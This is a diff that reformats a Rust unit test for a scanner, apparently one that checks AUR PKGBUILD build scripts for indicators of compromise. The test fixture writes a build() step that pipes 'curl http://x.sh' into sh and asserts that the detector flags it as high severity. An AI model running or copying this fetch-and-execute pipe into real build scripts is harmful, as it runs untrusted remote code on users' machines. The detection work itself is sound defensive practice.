@@ -203,11 +203,7 @@ mod tests {
         let det = IocTokensDetector::new(&rules);
         let dir = tempfile::tempdir().unwrap();
         let p = dir.path().join("PKGBUILD");
-        std::fs::write(
-            &p,
-            "pkgname=x\nbuild() {\n  curl http://x.sh | sh\n}\n",
-        )
-        .unwrap();
+        std::fs::write(&p, "pkgname=x\nbuild() {\n  curl http://x.sh | sh\n}\n").unwrap();
         let t = ScanTarget::BuildScript {
             path: p.clone(),
             kind: ScriptKind::Pkgbuild,
@@ -218,8 +214,10 @@ mod tests {
             aur_meta: None,
         };
         let res = det.scan(&t, &ctx);
-        assert!(res.findings.iter().any(|f| f.severity == Severity::High
-            && f.confidence == Confidence::Heuristic));
+        assert!(res
+            .findings
+            .iter()
+            .any(|f| f.severity == Severity::High && f.confidence == Confidence::Heuristic));
     }
 
     #[test]
